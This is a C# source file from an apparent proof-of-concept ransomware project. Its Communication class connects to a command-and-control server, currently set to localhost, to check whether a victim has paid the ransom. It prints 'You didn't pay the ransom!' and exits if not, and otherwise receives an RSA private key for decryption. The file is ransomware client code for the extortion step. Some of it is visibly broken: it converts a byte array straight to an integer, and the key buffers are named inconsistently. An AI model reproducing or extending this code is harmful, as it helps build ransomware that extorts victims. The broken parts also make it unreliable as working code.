using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace PocDecryptor
{
    class Communication
    {
        private const string CommandAndControlServerHostName = "localhost";
        private const string CommandAndControlServerAddress = "127.0.0.1";
        private const int CommandAndControlServerPort = 12345;
        private readonly IPEndPoint EndPoint;
        private readonly Socket CommmunicationSocket;

        public Communication()
        {
            //socket creation with the c&c server
            IPHostEntry host = Dns.GetHostEntry(CommandAndControlServerHostName);
            IPAddress ipAddress = host.AddressList[0];
            EndPoint = new IPEndPoint(ipAddress, CommandAndControlServerPort);
            CommmunicationSocket = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
        }
        public bool ConnectToCommandAndControl()
        {
            try
            {
                CommmunicationSocket.Connect(EndPoint);
                return true;
            }
            catch
            {
                Console.WriteLine("An Error while connecting to c&c");
                return false;

            }
        }

        public Byte[] ServerHello()//code 1=>tells the c&c server to get the private key if the victm paid the ransom
        {
            Byte[] intBytes = BitConverter.GetBytes(1);
            Byte[] RsaPublicKey = new byte[1024];
            try
            {
                CommmunicationSocket.Send(intBytes);
                Thread.Sleep(5000);
                CommmunicationSocket.Receive(RsaPublicKey);
                if(Convert.ToInt32(RsaPublicKey)==0)
                {
                    Console.WriteLine("You didn't pay the ransom!");
                    Environment.Exit(0);
                    return null;
                }
                return RsaPublicKey;

            }
            catch
            {

                Console.WriteLine("An Error when trying to retrive private key");
                return null;

            }


        }

        public Byte[] GetRsaPrivateKey()
        {
            try
            {
                Byte[] intBytes = BitConverter.GetBytes(1);
                Byte[] RsaPrivateKey = new byte[1024];
                CommmunicationSocket.Send(intBytes);
                Thread.Sleep(5000);
                CommmunicationSocket.Receive(RsaPrivateKey);
                return RsaPrivateKey;

            }
            catch
            {
                Console.WriteLine("An Error while recivimg rsa private key");
                return null;
            }




        }

    }
}
